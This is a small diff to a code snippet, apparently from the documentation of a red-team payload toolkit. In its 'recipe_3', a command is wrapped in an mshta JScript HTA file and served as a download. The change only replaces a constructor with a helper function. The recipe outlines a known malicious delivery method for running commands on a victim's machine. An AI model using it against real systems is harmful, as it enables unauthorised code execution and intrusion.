@@ -53,7 +53,7 @@ def recipe_3():
     hta: AceStr = makeMshtaJscriptExec(cmd)
     htaFile: AceFile = makeAceFile("test.hta", hta)
 
-    containerServe: AceRoute = AceRoute('/test.hta', hta, download=True, downloadName='test.hta')
+    containerServe: AceRoute = makeAceRoute('/test.hta', hta, download=True, downloadName='test.hta')
     serve(containerServe)
 ```
 
